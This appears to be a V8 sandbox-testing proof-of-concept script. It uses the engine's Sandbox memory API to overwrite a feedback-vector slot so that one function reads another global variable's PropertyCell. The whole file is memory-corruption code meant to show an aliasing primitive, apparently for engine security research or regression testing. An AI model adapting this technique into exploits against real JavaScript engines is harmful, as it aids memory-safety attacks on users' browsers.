// C18 H42: valid bytecode, cross-global PropertyCell live alias.
// Requires --sandbox-testing --allow-natives-syntax.
const kHeapObjectTag = 0x1;
const kJSFunctionType = Sandbox.getInstanceTypeIdFor("JS_FUNCTION_TYPE");
const kJSFunctionFeedbackCellOffset =
    Sandbox.getFieldOffset(kJSFunctionType, "feedback_cell");
const kFeedbackCellType = Sandbox.getInstanceTypeIdFor("FEEDBACK_CELL_TYPE");
const kFeedbackCellValueOffset =
    Sandbox.getFieldOffset(kFeedbackCellType, "value");

const memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
const getPtr = (obj) => Sandbox.getAddressOf(obj) + kHeapObjectTag;
const getField = (ptr, offset) =>
    memory.getUint32(ptr + offset - kHeapObjectTag, true);
const setField = (ptr, offset, value) =>
    memory.setUint32(ptr + offset - kHeapObjectTag, value, true);
const slotOffset = (slot) => 4 * (7 + slot);

function feedbackVectorOf(fn) {
  let fp = getPtr(fn);
  let fc = getField(fp, kJSFunctionFeedbackCellOffset);
  return getField(fc, kFeedbackCellValueOffset);
}

var C18_H42_A = 13;
var C18_H42_B = 99;
function f() {
  return C18_H42_A;
}
function g() {
  return C18_H42_B;
}

%EnsureFeedbackVectorForFunction(f);
%EnsureFeedbackVectorForFunction(g);
for (let i = 0; i < 1000; i++) {
  f();
  g();
}

let fvF = feedbackVectorOf(f);
let fvG = feedbackVectorOf(g);
setField(fvF, slotOffset(0), getField(fvG, slotOffset(0)));

print(`after-corrupt f=${f()} A=${C18_H42_A} B=${C18_H42_B}`);
C18_H42_A = 44;
print(`after-A-write f=${f()} A=${C18_H42_A} B=${C18_H42_B}`);
C18_H42_B = 1234;
print(`after-B-write f=${f()} A=${C18_H42_A} B=${C18_H42_B}`);
print("reads_B", f() === C18_H42_B);
print("done");
